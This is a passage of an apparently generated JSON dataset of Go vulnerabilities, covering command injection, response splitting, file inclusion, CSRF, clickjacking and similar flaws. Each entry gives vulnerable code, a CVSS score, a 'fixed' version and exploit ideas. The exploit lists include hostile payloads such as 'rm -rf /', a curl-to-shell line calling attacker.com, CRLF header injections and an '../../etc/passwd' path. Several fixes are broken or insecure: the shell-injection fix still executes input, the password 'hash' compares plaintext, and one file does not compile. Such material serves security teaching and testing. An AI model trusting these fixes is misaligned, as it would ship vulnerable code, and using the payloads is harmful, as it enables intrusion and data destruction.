        "fixed_code": "package main\n\ntype User struct {\n    Name string\n    isAdmin bool\n}\n\nfunc (u *User) makeAdmin() {\n    // Assuming only the system can set admin privileges, not based on user input.\n    // This is a mock function to demonstrate fixing privilege escalation.\n}",
        "exploit_ways": [
            "An attacker could exploit this by creating a user with the name 'admin' to gain administrative rights.",
            "If the application logic allows user registration or modification, an attacker can manipulate these processes to set isAdmin to true.",
            "By leveraging other vulnerabilities to call makeAdmin directly, an attacker could elevate their privileges."
        ]
    },
    "go_18": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "package main\n\nimport (\n\t\"encoding/gob\"\n\t\"fmt\"\n\t\"os\"\n)\n\ntype User struct {\n\tName string\n\tAdmin bool\n}\n\nfunc main() {\n\tvar user User\n\tfile, _ := os.Open(\"user.gob\")\n\tdecoder := gob.NewDecoder(file)\n\tdecoder.Decode(&user)\n\tfmt.Printf(\"User: %+v\\n\", user)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n\t\"encoding/gob\"\n\t\"fmt\"\n\t\"os\"\n\t\"log\"\n)\n\ntype User struct {\n\tName string\n\tAdmin bool\n}\n\nfunc main() {\n\tvar user User\n\tfile, err := os.Open(\"user.gob\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to open file: %s\", err)\n\t}\n\tdefer file.Close()\n\tdecoder := gob.NewDecoder(file)\n\tif err := decoder.Decode(&user); err != nil {\n\t\tlog.Fatalf(\"Failed to decode user: %s\", err)\n\t}\n\tfmt.Printf(\"User: %+v\\n\", user)\n}",
        "exploit_ways": [
            "An attacker can craft a malicious .gob file that executes arbitrary code when deserialized.",
            "By manipulating the serialized object, an attacker could escalate privileges by setting Admin to true.",
            "The vulnerability could be used to inject and execute payloads, leading to potential remote code execution."
        ]
    },
    "go_19": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype User struct {\n\tUsername string\n\tPassword string\n}\n\nvar users = []User{\n\t{Username: \"admin\", Password: \"password123\"},\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n\tr.ParseForm()\n\tusername := r.Form.Get(\"username\")\n\tpassword := r.Form.Get(\"password\")\n\n\tfor _, user := range users {\n\t\tif user.Username == username && user.Password == password {\n\t\t\tfmt.Fprintf(w, \"Login successful!\")\n\t\t\treturn\n\t\t}\n\t}\n\tfmt.Fprintf(w, \"Invalid credentials\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/login\", loginHandler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 6.5,
        "fixed_code": "package main\n\nimport (\n\t\"crypto/subtle\"\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype User struct {\n\tUsername string\n\tPasswordHash []byte\n}\n\nvar users = []User{\n\t{Username: \"admin\", PasswordHash: []byte(\"e3JhYjZwQDIkMDkudFVxM2RvNzNyT01tQ2IyUW5LckFnKzg=\"),}, // hash of 'password123'\n}\n\nfunc checkPassword(hash, password string) bool {\n\tdecodedHash, _ := base64.StdEncoding.DecodeString(hash)\n\tpasswordBytes := []byte(password)\n\treturn subtle.ConstantTimeCompare(decodedHash, passwordBytes) == 1\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n\tr.ParseForm()\n\tusername := r.Form.Get(\"username\")\n\tpassword := r.Form.Get(\"password\")\n\n\tfor _, user := range users {\n\t\tif user.Username == username && checkPassword(string(user.PasswordHash), password) {\n\t\t\tfmt.Fprintf(w, \"Login successful!\")\n\t\t\treturn\n\t\t}\n\t}\n\tfmt.Fprintf(w, \"Invalid credentials\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/login\", loginHandler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker could try common username and password combinations to brute-force access.",
            "Using a dictionary attack, the attacker can automate attempts to find valid credentials.",
            "If the server logs are not protected, an attacker could analyze them for patterns in failed login attempts."
        ]
    },
    "go_20": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc executeCommand(command string) (string, error) {\n    cmd := exec.Command(\"sh\", \"-c\", command)\n    output, err := cmd.CombinedOutput()\n    if err != nil {\n        return string(output), err\n    }\n    return string(output), nil\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc executeCommand(command string) (string, error) {\n    cmd := exec.Command(\"sh\", command)\n    output, err := cmd.CombinedOutput()\n    if err != nil {\n        return string(output), err\n    }\n    return string(output), nil\n}",
        "exploit_ways": [
            "An attacker can input 'ls && rm -rf /' to delete all files.",
            "They can use 'curl http://attacker.com/malware.sh | sh' to execute remote code.",
            "Input like 'echo \\\"Exploit successful\\\" > /tmp/exploit.txt' can create a file in the /tmp directory."
        ]
    },
    "go_21": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc vulnerableFunction(input []byte) {\n\tvar buffer [16]byte\n\tcopy(buffer[:], input)\n}\n\nfunc main() {\n\tuserInput := []byte(\"This is a long string that will cause a buffer overflow\")\n\tvulnerableFunction(userInput)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc safeFunction(input []byte) {\n\tvar buffer [16]byte\n\tif len(input) > len(buffer) {\n\t\tpanic(\"Input exceeds buffer size\")\n\t}\n\tcopy(buffer[:], input)\n}\n\nfunc main() {\n\tuserInput := []byte(\"This is a long string that will cause a buffer overflow\")\n\tsafeFunction(userInput)\n}",
        "exploit_ways": [
            "An attacker can provide an excessively long byte slice to overwrite adjacent memory and potentially execute arbitrary code.",
            "The overflow could be used to corrupt the program's stack, leading to unpredictable behavior or crashes.",
            "If the buffer is located in a sensitive part of memory, overwriting it might allow an attacker to inject shellcode for remote execution."
        ]
    },
    "go_22": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "package main\nimport (\n    \"fmt\"\n)\nfunc vulnerableFunction() {\n    buf := [16]byte{}\n    var input string\n    fmt.Scanln(&input)\n    copy(buf[:], []byte(input))\n}\nfunc main() {\n    vulnerableFunction()\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\nimport (\n    \"fmt\"\n)\nfunc safeFunction() {\n    var input [16]byte\n    fmt.Scanln(&input)\n}\nfunc main() {\n    safeFunction()\n}",
        "exploit_ways": [
            "An attacker could provide a string longer than 16 bytes to overwrite adjacent memory and potentially change program execution flow.",
            "By carefully crafting input, an attacker may be able to execute arbitrary code by overwriting the return address on the stack.",
            "The vulnerability can lead to a Denial of Service (DoS) condition where the application crashes due to invalid memory access."
        ]
    },
    "go_23": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc escalatePrivileges(command string) error {\n    cmd := exec.Command(\"sudo\", command)\n    return cmd.Run()\n}\n\nfunc main() {\n    var userCommand string\n    fmt.Print(\"Enter a command to run with elevated privileges: \")\n    fmt.Scanln(&userCommand)\n    if err := escalatePrivileges(userCommand); err != nil {\n        fmt.Println(err)\n    }\n}",
        "cvss_score": 8.8,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nvar allowedCommands = map[string]bool{\n    \"apt-get\": true,\n    \"yum\":     true,\n}\n\nfunc escalatePrivileges(command string) error {\n    if _, ok := allowedCommands[command]; !ok {\n        return fmt.Errorf(\"command not allowed\")\n    }\n    cmd := exec.Command(\"sudo\", command)\n    return cmd.Run()\n}\n\nfunc main() {\n    var userCommand string\n    fmt.Print(\"Enter a command to run with elevated privileges: \")\n    fmt.Scanln(&userCommand)\n    if err := escalatePrivileges(userCommand); err != nil {\n        fmt.Println(err)\n    }\n}",
        "exploit_ways": [
            "User can input 'apt-get' followed by malicious parameters to install malware.",
            "Could use 'yum' with a crafted repository URL to execute arbitrary code.",
            "Entering 'bash' or other shell commands could provide an interactive shell with elevated privileges."
        ]
    },
    "go_24": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "package main\n\nimport (\n\t\\\"fmt\\\"\n\t\\\"net/http\\\"\n)\n\nfunc changeEmail(w http.ResponseWriter, r *http.Request) {\n\temail := r.FormValue(\\\"email\\\")\n\t// Update user email without CSRF protection\n\tfmt.Fprintf(w, \\\"Email changed to: %s\\\", email)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n\t\\\"crypto/rand\\\"\n\t\\\"encoding/base64\\\"\n\t\\\"fmt\\\"\n\t\\\"net/http\\\"\n\t\\\"github.com/gorilla/csrf\\\"\n)\n\nvar csrfHandler = csrf.Protect(generateCSRFKey(),\n\tcsrf.Secure(false)) // Secure should be true in production\n\nfunc generateCSRFKey() []byte {\n\tkey := make([]byte, 32)\n\t_, err := rand.Read(key)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn key\n}\n\nfunc changeEmail(w http.ResponseWriter, r *http.Request) {\n\temail := r.FormValue(\\\"email\\\")\n\t// Update user email with CSRF protection\n\tfmt.Fprintf(w, \\\"Email changed to: %s\\\", email)\n}",
        "exploit_ways": [
            "An attacker can create a malicious website that sends a request to change the victim's email.",
            "Using social engineering, an attacker can trick the user into clicking a link that changes their email without their knowledge.",
            "Crafting a CSRF token forgery attack if the protection is weak or improperly implemented."
        ]
    },
    "go_25": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"url\"\n)\n\nfunc redirectHandler(w http.ResponseWriter, r *http.Request) {\n    target := r.URL.Query().Get(\"url\")\n    parsedURL, err := url.Parse(target)\n    if err != nil {\n        fmt.Fprintf(w, \"Invalid URL\")\n        return\n    }\n    if parsedURL.Host == \"\" {\n        fmt.Fprintf(w, \"Missing host in URL\")\n        return\n    }\n    http.Redirect(w, r, target, http.StatusFound)\n}\n\nfunc main() {\n    http.HandleFunc(\"/redirect\", redirectHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 6.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"url\"\n)\n\nfunc redirectHandler(w http.ResponseWriter, r *http.Request) {\n    allowedHosts := []string{\"example.com\", \"safe.example.org\"}\n    target := r.URL.Query().Get(\"url\")\n    parsedURL, err := url.Parse(target)\n    if err != nil || !isValidHost(parsedURL.Host, allowedHosts) {\n        fmt.Fprintf(w, \"Invalid or unauthorized URL\")\n        return\n    }\n    http.Redirect(w, r, target, http.StatusFound)\n}\n\nfunc isValidHost(host string, allowed []string) bool {\n    for _, a := range allowed {\n        if host == a {\n            return true\n        }\n    }\n    return false\n}\n\nfunc main() {\n    http.HandleFunc(\"/redirect\", redirectHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can craft a URL to redirect users to a malicious site like 'http://malicious.com'.",
            "By using URL encoding, an attacker might bypass basic validation checks and still perform open redirection.",
            "The vulnerability could be used in phishing attacks by directing users to fake login pages that mimic legitimate ones."
        ]
    },
    "go_26": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tw.Write([]byte(\"Hello, world!\"))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 5.3,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tw.Header().Set(\"Content-Security-Policy\", \"default-src 'self'\")\n\tw.Header().Set(\"X-Content-Type-Options\", \"nosniff\")\n\tw.Header().Set(\"X-Frame-Options\", \"SAMEORIGIN\")\n\tw.Header().Set(\"X-XSS-Protection\", \"1; mode=block\")\n\tw.Write([]byte(\"Hello, world!\"))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "Attackers can inject malicious scripts into the page if content security policies are not set.",
            "An attacker could perform clickjacking since X-Frame-Options is not configured properly.",
            "Without X-XSS-Protection, cross-site scripting (XSS) attacks may be more effective."
        ]
    },
    "go_27": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "package main\n\ntype Clickjackable struct {\n    iframeURL string\n}\n\nfunc (c *Clickjackable) Render() string {\n    return \"<html><body><iframe src=\\\"\" + c.iframeURL + \"\\\"></iframe></body></html>\"\n}",
        "cvss_score": 2.6,
        "fixed_code": "package main\n\ntype Clickjackable struct {\n    iframeURL string\n}\n\nfunc (c *Clickjackable) Render() string {\n    return \"<html><head><style>body {display: none;}</style><meta http-equiv=\\\"X-Frame-Options\\\" content=\\\"DENY\\\"></head><body><iframe src=\\\"\" + c.iframeURL + \"\\\"></iframe></body></html>\"\n}",
        "exploit_ways": [
            "An attacker could host a malicious site that uses the vulnerable page in an iframe to trick users into clicking on it without their knowledge.",
            "By using the iframe, attackers can overlay the vulnerable page over another webpage making buttons or links appear to do something else.",
            "The vulnerability allows attackers to potentially steal user actions or information by mimicking trusted sites through framed content."
        ]
    },
    "go_28": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    fmt.Fprintf(w, `<html>\n<head><title>Clickjacking Example</title></head>\n<body>\n<iframe src=\"https://example.com\" width=\"100%\" height=\"100%\"></iframe>\n</body>\n</html>`)\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 2.6,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    w.Header().Set(\"X-Frame-Options\", \"DENY\")\n    fmt.Fprintf(w, `<html>\n<head><title>Clickjacking Example</title></head>\n<body>\n<iframe src=\"https://example.com\" width=\"100%\" height=\"100%\"></iframe>\n</body>\n</html>`)\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can embed the vulnerable page in an iframe on their malicious site to trick users into clicking without knowing.",
            "Users can be made to perform actions on the embedded frame, such as submitting forms or clicking buttons, by using overlaying transparent elements.",
            "Malicious sites could use the iframe to manipulate user interactions with the original site, potentially leading to data theft or unauthorized actions."
        ]
    },
    "go_29": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc slowFunction() {\n    for {\n        time.Sleep(1 * time.Second)\n        fmt.Println(\"Running...\")\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc slowFunction() {\n    for i := 0; i < 10; i++ { // Limit the number of iterations\n        time.Sleep(1 * time.Second)\n        fmt.Println(\"Running...\")\n    }\n}",
        "exploit_ways": [
            "An attacker can call slowFunction repeatedly, consuming system resources over time.",
            "If this function is part of a server process, repeated calls could prevent other requests from being handled promptly.",
            "By invoking the function in multiple goroutines, an attacker could significantly degrade performance."
        ]
    },
    "go_30": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"strings\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tname := r.URL.Query().Get(\"name\")\n\tif strings.Contains(name, \"\\r\\n\") || strings.Contains(name, \"\\n\") {\n\t\tfmt.Fprintf(w, \"Invalid input\")\n\t\treturn\n\t}\n\tresponse := fmt.Sprintf(\"Hello, %s! Welcome to our website.\", name)\n\tw.Write([]byte(response))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/greet\", handler)\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tname := r.URL.Query().Get(\"name\")\n\tsafeName := url.PathEscape(name)\n\tresponse := fmt.Sprintf(\"Hello, %s! Welcome to our website.\", safeName)\n\tw.Write([]byte(response))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/greet\", handler)\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
        "exploit_ways": [
            "An attacker can input 'name=John%0D%0ASet-Cookie:%20malicious=true' to inject cookies.",
            "They could use 'name=John%0DRefresh:%200;url=http://attacker.com' for session hijacking.",
            "Input like 'name=John%0DContent-Length:%200%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0AMalicious%20content' can lead to false responses."
        ]
    },
    "go_31": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfor {\n\t}\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
        "cvss_score": 5.3,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\ttimeout := time.After(2 * time.Second)\n\tselect {\n\tcase <-timeout:\n\t\tw.WriteHeader(http.StatusRequestTimeout)\n\t\tw.Write([]byte(\"Request timed out\\n\"))\n\t}\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
        "exploit_ways": [
            "An attacker can send a request that keeps the server in an infinite loop, exhausting resources.",
            "By sending multiple requests simultaneously, the server could become unresponsive to legitimate traffic.",
            "The handler's infinite loop can lead to memory exhaustion as each request consumes system resources indefinitely."
        ]
    },
    "go_32": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nvar counter int = 0\n\nfunc increment() {\n    for i := 0; i < 1000; i++ {\n        counter++\n        time.Sleep(1 * time.Nanosecond)\n    }\n}\n\nfunc main() {\n    go increment()\n    go increment()\n    time.Sleep(2 * time.Millisecond)\n    fmt.Println(\"Final Counter Value:\", counter)\n}",
        "cvss_score": 5.3,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"sync\"\n    \"time\"\n)\n\nvar counter int = 0\nvar mutex sync.Mutex\n\nfunc increment() {\n    for i := 0; i < 1000; i++ {\n        mutex.Lock()\n        counter++\n        mutex.Unlock()\n        time.Sleep(1 * time.Nanosecond)\n    }\n}\n\nfunc main() {\n    go increment()\n    go increment()\n    time.Sleep(2 * time.Millisecond)\n    fmt.Println(\"Final Counter Value:\", counter)\n}",
        "exploit_ways": [
            "An attacker could force the program to run in a specific timing pattern, leading to incorrect increments.",
            "By carefully controlling the execution environment and process scheduling, an attacker might manipulate the final value of the counter.",
            "In a more complex application, this race condition could lead to inconsistent or corrupted state data."
        ]
    },
    "go_33": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"strings\"\n)\n\ntype User struct {\n    Name string\n}\n\nfunc (u *User) Greet(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get(\"name\")\n    greeting := fmt.Sprintf(\"Hello, %s! Welcome to our site.\", name)\n    w.Write([]byte(greeting))\n}\n\nfunc main() {\n    user := &User{}\n    http.HandleFunc(\"/greet\", user.Greet)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 5.3,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"net/url\"\n    \"strings\"\n)\n\ntype User struct {\n    Name string\n}\n\nfunc (u *User) Greet(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get(\"name\")\n    encodedName := url.PathEscape(name)\n    greeting := fmt.Sprintf(\"Hello, %s! Welcome to our site.\", encodedName)\n    w.Write([]byte(greeting))\n}\n\nfunc main() {\n    user := &User{}\n    http.HandleFunc(\"/greet\", user.Greet)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can inject \\r\\n to split the HTTP response, leading to header injection.",
            "They could use \\r\\nSet-Cookie: evilCookie=maliciousValue; Path=/ to set a malicious cookie.",
            "Injecting \\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Malicious Content</body></html> could lead to display of arbitrary HTML content."
        ]
    },
    "go_34": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nglobalCounter int = 0\n\nfunc increment() {\n\tlocalCounter := globalCounter\n\ttime.Sleep(time.Millisecond)\n\tlocalCounter++\n\tglobalCounter = localCounter\n}\n\nfunc main() {\n\tfor i := 0; i < 1000; i++ {\n\t\tgo increment()\n\t}\n\ttime.Sleep(time.Second)\n\tfmt.Println(\"Final counter value:\", globalCounter)\n}",
        "cvss_score": 6.2,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n\t\"time\"\n)\n\nglobalCounter int = 0\nvar mu sync.Mutex\n\nfunc increment() {\n\tmu.Lock()\n\tdefer mu.Unlock()\n\tglobalCounter++\n}\n\nfunc main() {\n\tfor i := 0; i < 1000; i++ {\n\t\tgo increment()\n\t}\n\ttime.Sleep(time.Second)\n\tfmt.Println(\"Final counter value:\", globalCounter)\n}",
        "exploit_ways": [
            "An attacker could cause the counter to be incremented incorrectly, leading to data inconsistency.",
            "By timing attacks, an attacker might manipulate the state of shared variables leading to unexpected behavior in the application.",
            "If the code is part of a larger system, incorrect increments can propagate errors and affect other parts of the application."
        ]
    },
    "go_35": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "package main\n\nimport (\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    w.Write([]byte(\"Hello, world!\"))\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 2.7,
        "fixed_code": "package main\n\nimport (\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    w.Header().Set(\"Content-Security-Policy\", \"default-src 'self'\")\n    w.Header().Set(\"X-Frame-Options\", \"SAMEORIGIN\")\n    w.Header().Set(\"X-XSS-Protection\", \"1; mode=block\")\n    w.Header().Set(\"X-Content-Type-Options\", \"nosniff\")\n    w.Write([]byte(\"Hello, world!\"))\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker could perform Clickjacking attacks since X-Frame-Options is not set.",
            "Reflected XSS may be possible if user input is improperly handled and included in the response without sanitization.",
            "Content security policy (CSP) is missing, allowing potentially malicious scripts to be loaded."
        ]
    },
    "go_36": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n)\n\ntype FileReader struct {\n    filePath string\n}\n\nfunc (fr *FileReader) ReadFile() string {\n    data, _ := os.ReadFile(fr.filePath)\n    return string(data)\n}\n\nfunc main() {\n    var userPath string\n    fmt.Print(\"Enter file path: \")\n    fmt.Scan(&userPath)\n    reader := FileReader{filePath: userPath}\n    content := reader.ReadFile()\n    fmt.Println(content)\n}",
        "cvss_score": 4.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"path/filepath\"\n    \"strings\"\n)\n\ntype FileReader struct {\n    filePath string\n}\n\nfunc (fr *FileReader) ReadFile() (string, error) {\n    data, err := os.ReadFile(fr.filePath)\n    if err != nil {\n        return \"\", err\n    }\n    return string(data), nil\n}\n\nfunc main() {\n    var userPath string\n    fmt.Print(\"Enter file path: \")\n    fmt.Scan(&userPath)\n    baseDir := \"/safe/directory\"\n    absPath, err := filepath.Abs(userPath)\n    if err != nil {\n        fmt.Println(\"Invalid path\")\n        return\n    }\n    if !strings.HasPrefix(absPath, baseDir) {\n        fmt.Println(\"Access denied\")\n        return\n    }\n    reader := FileReader{filePath: absPath}\n    content, err := reader.ReadFile()\n    if err != nil {\n        fmt.Println(\"Error reading file:\", err)\n        return\n    }\n    fmt.Println(content)\n}",
        "exploit_ways": [
            "An attacker could enter a path like '../../etc/passwd' to read sensitive system files.",
            "By entering '..\\..\\windows\\system32\\drivers\\etc\\hosts' on Windows, an attacker can access the hosts file.",
            "Supplying a crafted path with null bytes or special characters might bypass some simple checks in the application."
        ]
    },
    "go_37": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "package main\nimport \"net/http\"\nfunc vulnerableHandler(w http.ResponseWriter, r *http.Request) {\n    w.Header().Set(\"X-Frame-Options\", \"DENY\")\n    if r.URL.Path == \"/clickjack\" {\n        w.Write([]byte(`<iframe src=\"https://example.com\"></iframe>`))\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "package main\nimport \"net/http\"\nfunc secureHandler(w http.ResponseWriter, r *http.Request) {\n    w.Header().Set(\"X-Frame-Options\", \"SAMEORIGIN\")\n    if r.URL.Path == \"/clickjack\" {\n        w.Write([]byte(`<iframe src=\"https://example.com\"></iframe>`))\n    }\n}",
        "exploit_ways": [
            "An attacker can host a malicious site that frames the vulnerable page to trick users into clicking on unintended elements.",
            "If X-Frame-Options is set to DENY, it prevents framing entirely but does not allow for same-origin framing which might be needed. Setting it to SAMEORIGIN allows framing only from the same origin, mitigating clickjacking risks more effectively.",
            "Attackers could use social engineering tactics to lure users to a site that contains a malicious iframe pointing to the vulnerable page."
        ]
    },
    "go_38": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"crypto/rand\"\n    \"encoding/base64\"\n)\n\nfunc generateSessionID() string {\n    b := make([]byte, 32)\n    rand.Read(b)\n    return base64.URLEncoding.EncodeToString(b)\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        sessionID := generateSessionID()\n        cookie := &http.Cookie{\n            Name:  \"session_id\",\n            Value: sessionID,\n            Path:  \"/\",\n        }\n        http.SetCookie(w, cookie)\n        fmt.Fprintf(w, \"Logged in with session ID: %s\", sessionID)\n    } else {\n        fmt.Fprintln(w, \"Invalid request method\")\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/login\", loginHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 3.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"crypto/rand\"\n    \"encoding/base64\"\n    \"github.com/gorilla/securecookie\"\n)\n\nvar cookieHandler = securecookie.New(securecookie.GenerateRandomKey(64), securecookie.GenerateRandomKey(32))\n\nfunc generateSessionID() string {\n    b := make([]byte, 32)\n    rand.Read(b)\n    return base64.URLEncoding.EncodeToString(b)\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n    if r.Method == \"POST\" {\n        sessionID := generateSessionID()\n        encoded, err := cookieHandler.Encode(\"session_id\", sessionID)\n        if err != nil {\n            http.Error(w, err.Error(), http.StatusInternalServerError)\n            return\n        }\n        cookie := &http.Cookie{\n            Name:  \"session_id\",\n            Value: encoded,\n            Path:  \"/\",\n            HttpOnly: true,\n            Secure: true,\n            SameSite: http.SameSiteStrictMode,\n        }\n        http.SetCookie(w, cookie)\n        fmt.Fprintf(w, \"Logged in with session ID\")\n    } else {\n        fmt.Fprintln(w, \"Invalid request method\")\n    }\n}\n\nfunc main() {\n    http.HandleFunc(\"/login\", loginHandler)\n    http.ListenAndServeTLS(\":8080\", \"cert.pem\", \"key.pem\", nil)\n}",
        "exploit_ways": [
            "An attacker could set a fixed session ID in the browser cookie and attempt to hijack an existing user's session.",
            "By exploiting predictable session IDs, attackers might guess or brute-force other valid session tokens.",
            "If combined with cross-site scripting (XSS), an attacker can steal a valid session cookie from another user."
        ]
    },
    "go_39": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype ResponseSplitter struct {\n}\n\nfunc (r *ResponseSplitter) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n\tparam := req.URL.Query().Get(\"param\")\n\tw.Header().Set(\"Custom-Header\", param)\n\tfmt.Fprintf(w, \"Parameter: %s\", param)\n}\n\nfunc main() {\n\thttp.Handle(\"/\", &ResponseSplitter{})\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 5.3,
